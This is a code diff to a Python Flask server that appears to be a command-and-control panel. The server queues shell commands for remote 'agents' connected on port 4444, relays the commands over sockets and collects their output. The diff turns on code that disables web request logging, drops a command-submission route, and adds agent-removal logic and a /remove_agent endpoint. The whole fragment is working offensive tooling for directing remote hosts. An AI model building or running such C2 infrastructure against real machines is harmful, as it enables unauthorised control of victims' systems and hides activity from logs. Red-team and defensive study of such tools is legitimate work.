@@ -14,8 +14,8 @@ SERVER_PORT = 4444
 # Flask stuff
 app = Flask(__name__)
 app.secret_key = "ac2_secret"
-#log = logging.getLogger('werkzeug')
-#log.disabled = True
+log = logging.getLogger('werkzeug')
+log.disabled = True
 
 # Set up server logging
 logger = logging.getLogger(__name__)
@@ -78,6 +78,14 @@ def handle_client(client_socket, client_address):
                 if not agent.command_queue.empty():
                     # Get the next command from the queue
                     command = agent.command_queue.get()
+
+                    # Check if agent is exiting
+                    if command == "exit\n":
+                        # Remove agent from data structures
+                        registered_agents_id[agent.id] = None  # Set to None to keep indexing intact
+                        registered_agents_ip.pop(agent.ip, None)
+                        registered_addresses.discard(agent.ip)
+
                     logging.info(f"[+] Sending command to {client_address}: {command}")
                     client_socket.sendall(command.encode())
 
@@ -160,7 +168,11 @@ def dashboard():
     if 'username' not in session:
         flash('Please log in first.', 'warning')
         return redirect(url_for('login'))
-    return render_template('dashboard.html', username=session['username'], agents=registered_agents_id[1:])
+
+    # Filter out any removed agents (None values) before passing to the template
+    active_agents = [agent for agent in registered_agents_id if agent is not None]
+
+    return render_template('dashboard.html', username=session['username'], agents=active_agents)
 
 @app.route('/logs')
 def logs():
@@ -176,14 +188,6 @@ def logs():
 
     # Render the log contents in the HTML template
     return render_template('logs.html', log_content=log_content)
-
-@app.route('/submit_command', methods=['POST'])
-def submit_command():
-    command = request.form.get('command')
-    if command:
-        command_queue.append(command)
-        flash(f'Command "{command}" added to queue!', 'info')
-    return redirect(url_for('dashboard'))
 
 @app.route('/logout')
 def logout():
@@ -224,6 +228,28 @@ def retrieve_output():
         return jsonify({"success": True, "output": output})
     else:
         return jsonify({"success": False, "error": "Invalid agent ID"}), 400
+
+@app.route('/remove_agent', methods=['POST'])
+def remove_agent():
+    data = request.get_json()
+    agent_id = int(data.get('agent_id'))
+
+    # Ensure the agent exists in the registered_agents_id list
+    if 0 < agent_id < len(registered_agents_id) and registered_agents_id[agent_id] is not None:
+        try:
+            agent = registered_agents_id[agent_id]
+            agent_ip = agent.ip
+
+            # Terminate session by queueing `exit`, rest will be handled by client thread
+            agent.command_queue.put("exit\n")
+
+            logger.info(f"[+] Agent {agent.hostname} (ID: {agent.id}, IP: {agent.ip}) removed successfully.")
+            return jsonify({"success": True})
+        except Exception as e:
+            logger.error(f"[!] Error removing agent with ID {agent_id}: {e}")
+            return jsonify({"success": False, "error": str(e)})
+    else:
+        return jsonify({"success": False, "error": "Agent not found."}), 400
 
 if __name__ == '__main__':
     # Default creds
